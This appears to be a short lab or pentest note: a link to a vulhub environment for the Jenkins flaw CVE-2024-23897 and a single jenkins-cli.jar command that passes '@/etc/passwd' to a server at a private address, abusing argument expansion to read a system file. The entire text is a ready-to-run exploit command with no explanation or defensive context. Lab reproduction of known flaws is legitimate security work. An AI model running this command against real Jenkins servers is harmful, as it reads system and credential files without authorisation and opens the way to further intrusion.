
[Exploit](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897)
java -jar jenkins-cli.jar -s http://172.17.0.2:8080/ -http connect-node "@/etc/passwd"

